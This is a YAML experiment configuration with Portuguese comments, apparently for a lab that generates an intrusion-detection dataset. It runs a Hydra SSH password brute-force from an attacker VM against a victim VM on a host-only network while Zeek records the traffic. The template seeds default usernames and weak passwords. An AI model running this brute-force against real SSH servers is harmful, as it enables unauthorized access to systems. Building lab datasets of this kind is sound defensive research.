# Experimento: sweep com Hydra (SSH) gerando dataset com coleta/ETL acoplados
experiment:
  id: exp_hydra_sweep

network:
  # Segurança: o Runner aborta se não for host_only
  mode: host_only

# Variáveis globais usadas pelo Runner, perfis e templates
gvars:
  # Janela (segundos) para agregação no pré-ETL (conn.log -> features_conn_window.csv)
  pre_etl_window_s: 60
  # Duração máxima de comandos remotos via SSH (failsafe)
  max_duration_s: 900
  # Onde o atacante grava os arquivos do Hydra (na VM attacker)
  local_lists: "$HOME/tcc/lists"

# Papéis das VMs (IPs são resolvidos automaticamente pelo Runner)
roles:
  - attacker
  - victim
  - sensor

# Templates de ações (reuso em perfis)
templates:
  hydra_ssh_template:
    label: "HydraSSH"
    engine: bash
    # O {victim} é substituído pelo Runner com o IP resolvido da vítima
    script: |
      set -e
      mkdir -p "{local_lists}"
      users_file="{local_lists}/users.txt"
      wordlist_file="{local_lists}/small_wordlist.txt"
      out_file="{local_lists}/hydra_{victim}.out"

      # Se não existirem, cria entradas mínimas de usuários/senhas p/ teste
      test -s "$users_file" || printf "vagrant\nroot\n" > "$users_file"
      test -s "$wordlist_file" || printf "vagrant\n123456\npassword\n" > "$wordlist_file"

      echo "[hydra] atacando {victim}:22 (SSH); saída: $out_file"
      hydra -L "$users_file" -P "$wordlist_file" -t 4 -f -o "$out_file" ssh://{victim}:22

profiles:
  # Perfil que instancia o template acima no host 'attacker'
  hydra_ssh_quick:
    template: hydra_ssh_template
    host: attacker
    # timeout de SSH usado pelo Runner
    timeout_s: 420

workflow:
  - name: safety
    actions:
      - ensure_network_mode: {}
      - resolve_ips: {}

  - name: start
    actions:
      - start_sensor: {}
      # Pequeno aquecimento benigno para o Zeek registrar tráfego de base
      - run_cmd:
          host: attacker
          cmd: |
            set -e
            for i in $(seq 1 20); do
              curl -s "http://{victim}:80/" >/dev/null && echo "HTTP OK" && break
              sleep 0.5
            done || { echo "HTTP indisponível em 10s"; exit 1; }
      - wait_seconds: { seconds: 2 }

  - name: attack_hydra
    actions:
      - run_profile: { profile_id: hydra_ssh_quick }
      - wait_seconds: { seconds: 3 }

  - name: stop_and_collect
    actions:
      - stop_sensor: {}
      # Margem para flush dos logs do Zeek/tcpdump
      - wait_seconds: { seconds: 3 }
      # ESSENCIAL: coleta artefatos + escreve metadata/timeline + roda ETL
      - collect_artifacts: {}
